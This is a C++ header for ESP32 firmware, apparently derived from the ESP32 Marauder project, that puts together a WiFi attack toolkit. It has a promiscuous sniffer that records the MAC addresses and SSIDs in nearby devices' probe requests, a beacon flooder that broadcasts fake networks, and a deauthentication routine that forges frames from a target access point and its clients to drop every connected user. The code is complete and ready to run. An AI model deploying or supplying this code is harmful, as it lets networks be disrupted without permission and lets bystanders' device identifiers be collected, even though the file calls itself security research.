#ifndef WiFiMarauder_h
#define WiFiMarauder_h

// ---------------------------------------------------------------
// WiFiMarauder — WiFi security research toolkit
//
// Features:
//   - Passive sniffer: packet stats + probe request capture
//   - Beacon flood: fake SSID broadcast (random/rickroll/funny)
//   - Deauth: 802.11 deauthentication frames
//
// Passive (sniffer) uses STA + promiscuous mode.
// Active (beacon/deauth) uses AP mode + esp_wifi_80211_tx().
// These modes are mutually exclusive.
//
// Runs on Core 1 (main loop). Promiscuous callback is ISR-like —
// keep it fast, no LVGL or Serial calls inside.
// ---------------------------------------------------------------

#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"

// esp_wifi_80211_tx is in esp_wifi.h but declare explicitly for clarity
extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

class WiFiMarauder {
public:
    // ---- Passive mode lifecycle (STA + promiscuous) ----
    static void init()
    {
        if (active) return;

        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        vTaskDelay(pdMS_TO_TICKS(100));

        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);

        active = true;
        Serial.println("[Marauder] init OK");
    }

    static void deinit()
    {
        stopSniff();
        stopBeaconFlood();
        stopDeauth();
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);
        active = false;
        Serial.println("[Marauder] deinit");
    }

    // ---- Active mode lifecycle (AP for raw TX) ----
    static void initActive()
    {
        if (active) return;

        // Start a hidden AP — required for esp_wifi_80211_tx(WIFI_IF_AP, ...)
        WiFi.mode(WIFI_AP);
        WiFi.softAP("", "", 1, 1, 0);  // hidden SSID, ch1, hidden=1, max_conn=0
        vTaskDelay(pdMS_TO_TICKS(100));

        active = true;
        Serial.println("[Marauder] initActive OK (AP mode)");
    }

    static void deinitActive()
    {
        stopBeaconFlood();
        stopDeauth();
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        active = false;
        Serial.println("[Marauder] deinitActive");
    }

    // ================================================================
    // Promiscuous Sniffer (passive — STA mode)
    // ================================================================
    static void startSniff()
    {
        if (!active) return;

        pktMgmt = 0; pktData = 0; pktMisc = 0;
        probeCount = 0; probeWriteIdx = 0; probeReadIdx = 0;
        sniffChannel = 1;
        lastChannelHop = millis();

        esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
        sniffing = true;
        Serial.println("[Marauder] sniff started");
    }

    static void stopSniff()
    {
        if (sniffing) {
            esp_wifi_set_promiscuous(false);
            sniffing = false;
            Serial.println("[Marauder] sniff stopped");
        }
    }

    static void sniffLoop()
    {
        if (!sniffing) return;
        unsigned long now = millis();
        if (now - lastChannelHop >= 250) {
            lastChannelHop = now;
            sniffChannel++;
            if (sniffChannel > 13) sniffChannel = 1;
            esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        }
    }

    // ================================================================
    // Beacon Flood (active — AP mode)
    // ================================================================
    // mode: 0 = random SSIDs, 1 = rickroll, 2 = funny names
    static void startBeaconFlood(int mode)
    {
        if (!active) return;
        beaconMode = mode;
        beaconCount = 0;
        flooding = true;
        Serial.printf("[Marauder] beacon flood started (mode %d)\n", mode);
    }

    static void stopBeaconFlood()
    {
        if (flooding) {
            flooding = false;
            Serial.println("[Marauder] beacon flood stopped");
        }
    }

    // Call from loop() — sends a batch of beacons per iteration
    static void beaconLoop()
    {
        if (!flooding) return;

        if (beaconMode == 0) {
            // Random SSIDs — generate and broadcast
            for (int i = 0; i < 10; i++) {
                char ssid[17];
                int len = random(6, 16);
                for (int j = 0; j < len; j++)
                    ssid[j] = alfa[random(sizeof(alfa) - 1)];
                ssid[len] = '\0';
                sendBeacon(ssid);
            }
        }
        else if (beaconMode == 1) {
            // Rickroll
            for (int i = 0; i < RICK_ROLL_COUNT; i++)
                sendBeacon(rick_roll[i]);
        }
        else if (beaconMode == 2) {
            // Funny names
            for (int i = 0; i < FUNNY_NAMES_COUNT; i++)
                sendBeacon(funny_names[i]);
        }

        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // ================================================================
    // Deauth (active — AP mode)
    // ================================================================

    // Scan for targets using STA mode — call BEFORE initActive()
    // Returns number of targets found. Caller should be in STA or OFF mode.
    static int scanTargets()
    {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        vTaskDelay(pdMS_TO_TICKS(100));

        int n = WiFi.scanNetworks(false, true);  // sync, show hidden
        targetCount = 0;

        for (int i = 0; i < n && targetCount < MAX_TARGETS; i++) {
            String ssid = WiFi.SSID(i);
            ssid.toCharArray(targets[targetCount].ssid, sizeof(targets[0].ssid));
            memcpy(targets[targetCount].bssid, WiFi.BSSID(i), 6);
            targets[targetCount].rssi = WiFi.RSSI(i);
            targets[targetCount].channel = WiFi.channel(i);
            targetCount++;
        }

        WiFi.scanDelete();
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);

        Serial.printf("[Marauder] scan found %d targets\n", targetCount);
        return targetCount;
    }

    static void startDeauth(int targetIdx)
    {
        if (!active || targetIdx < 0 || targetIdx >= targetCount) return;
        deauthTargetIdx = targetIdx;
        deauthCount = 0;
        deauthing = true;
        Serial.printf("[Marauder] deauth started on %s (ch %d)\n",
                      targets[targetIdx].ssid, targets[targetIdx].channel);
    }

    static void stopDeauth()
    {
        if (deauthing) {
            deauthing = false;
            Serial.println("[Marauder] deauth stopped");
        }
    }

    // Call from loop() — sends deauth burst
    static void deauthLoop()
    {
        if (!deauthing) return;
        if (deauthTargetIdx < 0 || deauthTargetIdx >= targetCount) {
            deauthing = false;
            return;
        }

        APTarget &t = targets[deauthTargetIdx];

        // Send burst of deauth frames
        for (int i = 0; i < 5; i++)
            sendDeauthPair(t.bssid, t.channel);

        vTaskDelay(pdMS_TO_TICKS(50));
    }

    // ================================================================
    // Public stats
    // ================================================================
    static volatile int pktMgmt;
    static volatile int pktData;
    static volatile int pktMisc;
    static volatile int probeCount;
    static volatile int beaconCount;
    static volatile int deauthCount;

    // ---- Probe request ring buffer ----
    struct ProbeEntry {
        uint8_t mac[6];
        char ssid[33];
        int8_t rssi;
    };
    static const int PROBE_BUF_SIZE = 50;
    static ProbeEntry probes[PROBE_BUF_SIZE];
    static volatile int probeWriteIdx;
    static int probeReadIdx;

    // ---- AP targets (from scan) ----
    struct APTarget {
        char ssid[33];
        uint8_t bssid[6];
        int8_t rssi;
        uint8_t channel;
    };
    static const int MAX_TARGETS = 20;
    static APTarget targets[MAX_TARGETS];
    static int targetCount;

    // Current sniff channel
    static uint8_t sniffChannel;

    // SSID lists
    static const char* const rick_roll[];
    static const int RICK_ROLL_COUNT = 8;
    static const char* const funny_names[];
    static const int FUNNY_NAMES_COUNT = 12;

    static bool isActive() { return active; }
    static bool isSniffing() { return sniffing; }
    static bool isFlooding() { return flooding; }
    static bool isDeauthing() { return deauthing; }

private:
    static bool active;
    static bool sniffing;
    static bool flooding;
    static bool deauthing;
    static int beaconMode;
    static int deauthTargetIdx;
    static unsigned long lastChannelHop;

    // Random alphanumeric chars for SSID generation
    static constexpr char alfa[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    // ---- 802.11 beacon frame template (128 bytes) ----
    static uint8_t beaconPacket[128];

    // ---- 802.11 deauth frame template (26 bytes) ----
    static uint8_t deauthFrame[26];

    // ---- Promiscuous callback (ISR-like — keep fast!) ----
    static void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type)
    {
        if (!sniffing) return;

        switch (type) {
            case WIFI_PKT_MGMT: pktMgmt++; break;
            case WIFI_PKT_DATA: pktData++; break;
            default:            pktMisc++; break;
        }

        if (type != WIFI_PKT_MGMT) return;

        const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
        const uint8_t* payload = pkt->payload;
        int len = pkt->rx_ctrl.sig_len;

        if (len < 24) return;

        uint8_t frameType    = (payload[0] & 0x0C) >> 2;
        uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;

        if (frameType != 0 || frameSubtype != 4) return;  // Not probe request

        const uint8_t* srcMac = &payload[10];
        const uint8_t* tagged = &payload[24];
        int taggedLen = len - 24;
        char ssid[33] = {0};

        if (taggedLen >= 2 && tagged[0] == 0) {
            uint8_t ssidLen = tagged[1];
            if (ssidLen > 0 && ssidLen <= 32 && ssidLen + 2 <= taggedLen) {
                memcpy(ssid, &tagged[2], ssidLen);
                ssid[ssidLen] = '\0';
            } else if (ssidLen == 0) {
                ssid[0] = '*'; ssid[1] = '\0';
            }
        }

        int idx = probeWriteIdx % PROBE_BUF_SIZE;
        memcpy(probes[idx].mac, srcMac, 6);
        memcpy(probes[idx].ssid, ssid, sizeof(probes[idx].ssid));
        probes[idx].rssi = pkt->rx_ctrl.rssi;
        probeWriteIdx++;
        probeCount++;
    }

    // ---- Random MAC address ----
    static void randomMAC(uint8_t* mac)
    {
        for (int i = 0; i < 6; i++)
            mac[i] = random(256);
        mac[0] &= 0xFE;  // Unicast
        mac[0] |= 0x02;  // Locally administered
    }

    // ---- Send one beacon frame ----
    static void sendBeacon(const char* ssid)
    {
        uint8_t ch = random(1, 12);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

        // Random source MAC + BSSID
        randomMAC(&beaconPacket[10]);
        memcpy(&beaconPacket[16], &beaconPacket[10], 6);

        // SSID tag
        int ssidLen = strlen(ssid);
        if (ssidLen > 32) ssidLen = 32;
        beaconPacket[37] = ssidLen;
        memcpy(&beaconPacket[38], ssid, ssidLen);

        // Post-SSID: Supported Rates (tag 1) + DS Parameter Set (tag 3)
        uint8_t postSSID[13] = {
            0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
            0x03, 0x01, ch
        };
        memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));

        int totalLen = 38 + ssidLen + sizeof(postSSID);

        // Send 3 copies (matches Marauder behavior)
        esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, totalLen, false);
        esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, totalLen, false);
        esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, totalLen, false);

        beaconCount += 3;
    }

    // ---- Send deauth frame pair (AP→broadcast + broadcast→AP) ----
    static void sendDeauthPair(const uint8_t* bssid, uint8_t channel)
    {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        // Frame 1: pretend to be AP, deauth all clients
        memset(&deauthFrame[4], 0xFF, 6);      // DA = broadcast
        memcpy(&deauthFrame[10], bssid, 6);     // SA = AP
        memcpy(&deauthFrame[16], bssid, 6);     // BSSID = AP

        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);

        // Frame 2: pretend to be client, deauth from AP
        memcpy(&deauthFrame[4], bssid, 6);      // DA = AP
        randomMAC(&deauthFrame[10]);             // SA = random client
        memcpy(&deauthFrame[16], bssid, 6);     // BSSID = AP

        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);

        deauthCount += 4;
    }
};

// ================================================================
// Static member definitions
// ================================================================
bool WiFiMarauder::active = false;
bool WiFiMarauder::sniffing = false;
bool WiFiMarauder::flooding = false;
bool WiFiMarauder::deauthing = false;
int WiFiMarauder::beaconMode = 0;
int WiFiMarauder::deauthTargetIdx = -1;
unsigned long WiFiMarauder::lastChannelHop = 0;
uint8_t WiFiMarauder::sniffChannel = 1;

volatile int WiFiMarauder::pktMgmt = 0;
volatile int WiFiMarauder::pktData = 0;
volatile int WiFiMarauder::pktMisc = 0;
volatile int WiFiMarauder::probeCount = 0;
volatile int WiFiMarauder::beaconCount = 0;
volatile int WiFiMarauder::deauthCount = 0;

WiFiMarauder::ProbeEntry WiFiMarauder::probes[WiFiMarauder::PROBE_BUF_SIZE] = {};
volatile int WiFiMarauder::probeWriteIdx = 0;
int WiFiMarauder::probeReadIdx = 0;

WiFiMarauder::APTarget WiFiMarauder::targets[WiFiMarauder::MAX_TARGETS] = {};
int WiFiMarauder::targetCount = 0;

constexpr char WiFiMarauder::alfa[];

// 802.11 beacon frame template
// FC=0x80 (beacon), Duration=0, DA=broadcast, SA/BSSID=randomized
// Timestamp + Interval(100ms) + Capability(ESS+short preamble)
// SSID tag starts at offset 36 (tag=0x00, length at [37], data at [38+])
uint8_t WiFiMarauder::beaconPacket[128] = {
    0x80, 0x00, 0x00, 0x00,                         // Frame Control, Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,              // DA: broadcast
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,              // SA: randomized
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,              // BSSID: = SA
    0xC0, 0x6C,                                       // Seq Control
    0x83, 0x51, 0xF7, 0x8F, 0x0F, 0x00, 0x00, 0x00,  // Timestamp
    0x64, 0x00,                                       // Beacon interval (100 TU)
    0x01, 0x04,                                       // Capability info
    0x00                                              // SSID tag number
};

// 802.11 deauth frame template
// FC=0xC0 (deauth), reason=0x0002 (prev auth no longer valid)
uint8_t WiFiMarauder::deauthFrame[26] = {
    0xC0, 0x00,                                       // Frame Control (deauth)
    0x3A, 0x01,                                       // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,               // DA (target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,               // SA (source)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,               // BSSID
    0xF0, 0xFF,                                       // Seq Control
    0x02, 0x00                                        // Reason code
};

// SSID lists (from ESP32 Marauder)
const char* const WiFiMarauder::rick_roll[] = {
    "01 Never gonna give you up",
    "02 Never gonna let you down",
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you"
};

const char* const WiFiMarauder::funny_names[] = {
    "Abraham Linksys",
    "Benjamin FrankLAN",
    "Dora the Internet Explorer",
    "FBI Surveillance Van 4",
    "Get Off My LAN",
    "Loading...",
    "Martin Router King",
    "404 Wi-Fi Unavailable",
    "Test Wi-Fi Please Ignore",
    "This LAN is My LAN",
    "Titanic Syncing",
    "Winternet is Coming"
};

#endif
